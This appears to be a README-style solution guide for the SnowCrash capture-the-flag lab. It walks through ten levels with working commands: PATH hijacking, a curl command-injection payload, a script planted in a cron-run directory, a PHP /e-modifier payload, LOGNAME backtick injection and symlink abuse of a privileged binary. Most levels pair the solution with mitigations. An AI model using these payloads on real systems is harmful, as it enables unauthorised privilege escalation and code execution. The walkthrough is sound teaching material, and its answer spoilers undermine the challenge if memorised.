# SnowCrash - Penetration Testing CTF Challenge Guide

## Overview

SnowCrash is a penetration testing and cybersecurity learning project designed as a Capture The Flag (CTF) style challenge. It consists of 10 progressive levels (Level 00 through Level 09) that teach various security exploitation techniques, privilege escalation, and system vulnerability analysis.

This repository contains solutions and walkthrough guides for each level of the SnowCrash challenge.

## Project Structure

```
snowcrash/
├── docs/                    # Documentation and guides
├── linpeas.txt             # Linux privilege escalation analysis script output
├── level00/                # Initial level - File discovery
│   ├── flag                # Flag file (password)
│   └── resources/
│       └── getflag00.md    # Solution guide
├── level01/                # Hash cracking challenge
│   ├── flag
│   └── resources/
│       └── getflag01.md
├── level02/                # Network analysis
│   ├── flag
│   └── resources/
│       └── getflag02.md
├── level03/                # PATH manipulation
│   ├── flag
│   └── resources/
│       └── instruction.md
├── level04/                # Command injection
│   ├── flag
│   └── resources/
│       └── getflag04.md
├── level05/                # Cron job exploitation
│   ├── flag
│   └── resources/
│       └── getflag05.md
├── level06/                # PHP code execution
│   ├── flag
│   └── resources/
│       └── getflag06.md
├── level07/                # Environment variable exploitation
│   ├── flag
│   └── resources/
│       └── getflag07.md
├── level08/                # Symbolic link exploitation
│   ├── flag
│   └── resources/
│       └── getflag08.md
└── level09/                # Encoding/decoding challenge
    ├── flag
    └── resources/
        └── getflag09.md
```

## Level Breakdown

### Level 00: File Discovery
**Challenge**: Locate a file belonging to the `flag00` user across the filesystem.

**Technique**: File system enumeration using `find` command with file ownership filters.

**Key Concept**: Understanding file permissions and UNIX file system structure.

**Solution Steps**:
```bash
find / -type f -user flag00 -print 2>/dev/null
```
- Examine the output file
- Decode the password using ROT cipher
- Use [dCode ROT Cipher Tool](https://www.dcode.fr/rot-cipher) for decryption

---

### Level 01: Hash Cracking
**Challenge**: Crack a password hash found in `/etc/passwd`.

**Technique**: Offline password cracking using `john` (John the Ripper).

**Key Concept**: Understanding Unix password hashing and dictionary attacks.

**Hash Found**:
```
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

**Solution Steps**:
```bash
# Extract the hash
john [--format=yescript] hash.txt [--wordlist=somelist.txt]
```

**Tools Used**:
- `john` - Password cracking tool
- Optional: Custom wordlist for faster cracking

---

### Level 02: Network Packet Analysis
**Challenge**: Analyze network traffic capture file to extract credentials.

**Technique**: Network traffic analysis using Wireshark.

**Key Concept**: Understanding TCP/IP protocols and traffic interception.

**Challenge File**: `level02.pcap` in `flag02` home directory

**Solution Steps**:
1. Open the pcap file in Wireshark
2. Right-click on any packet in a TCP conversation
3. Select "Follow → TCP Stream"
4. Search for plaintext credentials in the stream data

**Tools Used**:
- Wireshark - Network protocol analyzer
- tcpdump - Packet capture tool

---

### Level 03: PATH Manipulation
**Challenge**: Exploit script that uses `/usr/bin/env` without absolute paths.

**Technique**: Environment variable poisoning via PATH manipulation.

**Key Concept**: Understanding how executables are resolved and privilege escalation through environment manipulation.

**Vulnerability**: The script uses `/usr/bin/env` to execute commands, making it vulnerable to PATH hijacking.

**Solution Steps**:
```bash
# Create a malicious echo command
mkdir -p /tmp
echo '#!/bin/bash' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo

# Prepend /tmp to PATH so our malicious echo runs first
export PATH=/tmp:$PATH

# Execute the vulnerable script
# It will now run our getflag via our fake echo
```

**Learning Points**:
- Always use absolute paths in scripts
- Never trust user-controlled environment variables
- The order of directories in PATH matters

---

### Level 04: Command Injection
**Challenge**: Inject commands into a web service running on localhost.

**Technique**: OS command injection in web applications.

**Key Concept**: Understanding how unsanitized input can lead to arbitrary command execution.

**Service**: HTTP service running on `localhost:4747`

**Solution**:
```bash
curl "http://localhost:4747?x=\$(getflag)"
```

**Vulnerability Details**:
- The service takes user input from the `x` parameter
- Input is directly passed to a shell without sanitization
- Command substitution with `$(command)` allows arbitrary command execution

**Mitigation**:
- Input validation and sanitization
- Use parameterized/prepared statements
- Avoid shell execution when possible
- Use allowlists for input validation

---

### Level 05: Cron Job Exploitation
**Challenge**: Execute privileged code through a cron job script runner.

**Technique**: Cron job and script execution privilege escalation.

**Key Concept**: Understanding scheduled tasks and directory writable by unprivileged users.

**Process**:
1. Check `/var/mail` for hints about running scripts
2. A script runner executes all files in `/opt/openarenaserver/` with `flag05` privileges
3. Place a malicious script in the directory

**Solution Steps**:
```bash
# Create a script that calls getflag and saves output
echo '#!/bin/bash
getflag > /tmp/result' > /opt/openarenaserver/ran.sh

# Make it executable
chmod +x /opt/openarenaserver/ran.sh

# Wait for cron to execute it, then read the result
cat /tmp/result
```

**Learning Points**:
- Writable directories with high-privilege execution are dangerous
- Cron jobs can be exploited if they run user-writable code
- Monitor scheduled tasks regularly

---

### Level 06: PHP Code Execution
**Challenge**: Execute arbitrary code through PHP via a binary wrapper.

**Technique**: PHP code injection and command execution through regex.

**Key Concept**: Understanding PHP execution context and arbitrary code execution vulnerabilities.

**Files Available**:
- `level06` - Binary executable
- `level06.php` - PHP script to be processed

**PHP Vulnerability**: The PHP script uses preg_replace with `/e` modifier (deprecated), allowing code execution.

**Solution Steps**:
```bash
# Create a payload file with PHP code execution
echo '[x ${(exec(getflag))}]' > /tmp/p

# Run the binary with the payload
./level06 /tmp/p
```

**Output Analysis**:
```
PHP Notice: Undefined variable: Check flag.Here is your token : [flag_value]
```

**Learning Points**:
- The `/e` modifier in preg_replace is deprecated and dangerous (removed in PHP 5.5.0)
- Always sanitize and validate input before passing to string evaluation functions
- Be aware of deprecated PHP features that have security implications

---

### Level 07: Environment Variable Exploitation
**Challenge**: Exploit a binary that reads environment variables unsafely.

**Technique**: Environment variable injection with command substitution.

**Key Concept**: Understanding binary code analysis and unsafe environment variable usage.

**Decompiled Code Analysis**:
```c
int main(int argc,char **argv,char **envp) {
    char *buffer;
    char *local_1c;
    
    local_1c = (char *)0x0;
    pcVar1 = getenv("LOGNAME");
    asprintf(&local_1c,"/bin/echo %s ", pcVar1);
    iVar2 = system(local_1c);
    return iVar2;
}
```

**Vulnerability**: The `LOGNAME` environment variable is read and directly passed to `system()` without sanitization.

**Solution**:
```bash
# Set LOGNAME to a command substitution payload
export LOGNAME='`/bin/getflag`'

# Run the binary
./level07
```

**Command Execution Flow**:
1. Binary reads `LOGNAME` environment variable
2. Creates command: `/bin/echo `command_substitution` `
3. `system()` executes the command with backtick expansion
4. `getflag` is executed within the command substitution

**Mitigation**:
- Never use `system()` with user-controlled input
- Use safer alternatives like `execve()` with explicit argument arrays
- Sanitize or validate all environment variables

---

### Level 08: Symbolic Link Exploitation
**Challenge**: Exploit binary that reads files using symbolic links.

**Technique**: Symbolic link (symlink) race condition and TOCTOU (Time-of-Check Time-of-Use) vulnerability.

**Key Concept**: Understanding file descriptor attacks and privilege escalation through symbolic links.

**Challenge Files**:
- `level08` - Binary executable that reads files with flag08 privileges
- `token` - File containing password/token

**Vulnerability**: The binary follows symbolic links, allowing us to read files we shouldn't have access to.

**Solution Steps**:
```bash
# Create a symbolic link from target location to readable file
ln -s /home/user/level08/token /tmp/ok.link

# Execute the binary with the symlink
./level08 /tmp/ok.link

# This reads the token file with flag08 privileges
# The token becomes the password to flag08 user
```

**Exploitation Chain**:
1. Create symlink pointing to protected file
2. Binary reads through the symlink with elevated privileges
3. Obtain password/token for flag08 user
4. Switch to flag08 user: `su flag08`
5. Run `getflag` with flag08 privileges

**Mitigation**:
- Use `lstat()` instead of `stat()` to detect symlinks
- Implement proper input validation
- Drop privileges before accessing user-controlled paths
- Use `O_NOFOLLOW` flag with `open()`

---

### Level 09: Encoding/Decoding Challenge
**Challenge**: Decode a token by reversing a character-offset encoding algorithm.

**Technique**: Cryptanalysis and reverse engineering of custom encoding.

**Key Concept**: Understanding character encoding and algorithm reversal.

**Challenge**: The `level09` binary encodes input by adding the character index to each character's ASCII value.

**Encoding Algorithm**:
```
Encoded_char = Original_char + Index
```

**Decoding Algorithm**:
```
Original_char = Encoded_char - Index
```

**Solution (Python)**:
```python
elements = ['f', '4', 'k', 'm', 'm', '6', 'p', '|', '=', '130', '127', 'p', '130', 'n', '131', '130', 'D', 'B', '131', 'D', 'u', '{', '127', '140', '137']

result_chars = []
print("Index | Element | Value | Value-Index | ASCII Char")
print("-" * 55)

for index, element in enumerate(elements):
    # Check if element is a multi-digit number
    if element.isdigit():
        value = int(element)
    else:
        # Single character - get ASCII value
        value = ord(element)
    
    # Subtract index from value
    new_value = value - index
    
    # Convert to ASCII character
    result_char = chr(new_value)
    result_chars.append(result_char)
    
    print(f"{index:5d} | {element:7s} | {value:5d} | {new_value:11d} | {result_char}")

print("\n" + "="*55)
print("Decoded message:")
decoded = ''.join(result_chars)
print(decoded)
print("="*55)
```

**Note**: Non-printable characters may need special handling based on their value-index result.

---

## Setup and Installation

### Prerequisites
- Linux environment (virtual machine recommended)
- QEMU/KVM for running the VM
- Tools as required per level:
  - `find` - file search (Level 00)
  - `john` - password cracking (Level 01)
  - Wireshark - packet analysis (Level 02)
  - Bash - scripting (Levels 03, 05)
  - `curl` - HTTP requests (Level 04)
  - Python - decoding script (Level 09)
  - Ghidra/objdump - binary analysis (Levels 07-09)

### VM Creation

Run the provided setup script:
```bash
bash level00/resources/create.sh
```

This script will:
- Create a QEMU disk image (8GB)
- Configure 2GB RAM
- Set up port forwarding (5555 → 4242)
- Boot from SnowCrash ISO

### Accessing Levels

After VM setup, each level is typically accessed via:
```bash
su flag0X
getflag
```

Each level requires you to obtain the password for the next flag user to proceed.

---

## Security Concepts Covered

1. **File System Security** - File permissions and ownership
2. **Authentication** - Hash cracking and password security
3. **Network Security** - Packet analysis and interception
4. **Environment Variables** - PATH manipulation and injection
5. **Input Validation** - Command injection vulnerabilities
6. **Privilege Escalation** - Exploiting cron jobs and symlinks
7. **Code Execution** - PHP and shell execution vulnerabilities
8. **Binary Analysis** - Reverse engineering and decompilation
9. **Cryptography** - Encoding/decoding and algorithm reversal

---

## Useful Resources

### Tools
- **John the Ripper**: Password cracking
- **Wireshark**: Network protocol analysis
- **Ghidra**: Binary reverse engineering
- **Python**: Scripting and decoding
- **Bash**: Shell scripting for exploitation

### Security Learning
- OWASP Top 10 - Web application vulnerabilities
- CWE (Common Weakness Enumeration) - Software weaknesses
- CAPEC (Common Attack Pattern Expression and Classification) - Attack patterns

### References
- [dCode Online Tools](https://www.dcode.fr/) - Encoding/decoding tools
- [HackTricks](https://book.hacktricks.xyz/) - Penetration testing guide
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Security payloads

---

## Solutions Summary Table

| Level | Challenge Type | Technique | Difficulty |
|-------|---|---|---|
| 00 | File Discovery | Find + ROT Cipher | Easy |
| 01 | Hash Cracking | John the Ripper | Easy |
| 02 | Network Analysis | Wireshark TCP Stream | Easy |
| 03 | PATH Manipulation | Environment Variables | Medium |
| 04 | Command Injection | Curl + Shell Injection | Medium |
| 05 | Cron Exploitation | Script Injection | Medium |
| 06 | PHP Code Execution | Preg Replace /e Modifier | Medium |
| 07 | Env Variable Injection | Binary Analysis + Backticks | Medium |
| 08 | Symlink Exploitation | Symlink TOCTOU | Hard |
| 09 | Encoding Reversal | Cryptanalysis | Hard |

---

## Tips for Success

1. **Read Error Messages Carefully** - They often contain hints about the vulnerability
2. **Use strace/ltrace** - Trace system calls and library calls to understand binary behavior
3. **Analyze Network Traffic** - Use tcpdump or Wireshark to monitor what the application does
4. **Test Locally First** - Before exploiting on the actual system, test payloads in safe environments
5. **Document Your Process** - Keep notes of what works and what doesn't
6. **Think Like an Attacker** - Consider edge cases and unconventional input methods
7. **Use Version Information** - Outdated software versions have known vulnerabilities

---

## Disclaimer

This project is for **educational purposes only**. The techniques and exploits documented here should only be used on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.

---

**Last Updated**: January 2026  
**Project**: SnowCrash CTF Challenge  
**Type**: Penetration Testing / Cybersecurity Learning
